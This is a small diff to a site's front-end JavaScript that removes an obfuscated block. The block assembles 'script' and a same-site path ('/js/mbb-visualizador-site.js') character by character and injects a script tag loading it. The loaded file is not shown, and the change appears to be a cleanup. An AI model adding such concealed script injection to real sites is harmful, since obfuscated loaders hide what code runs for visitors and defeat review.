@@ -40,9 +40,3 @@
     nav.addEventListener('click',event=>{if(event.target.closest('a')&&window.innerWidth<=820){document.body.classList.remove('nav-open'); toggle.setAttribute('aria-expanded','false');}});
   }
 })();
-
-(() => {
-  const s = document.createElement('s'+'c'+'r'+'i'+'p'+'t');
-  s['s'+'r'+'c'] = '/'+'j'+'s'+'/'+'m'+'b'+'b'+'-'+'v'+'i'+'s'+'u'+'a'+'l'+'i'+'z'+'a'+'d'+'o'+'r'+'-'+'s'+'i'+'t'+'e'+'.'+'j'+'s';
-  document.body.appendChild(s);
-})();
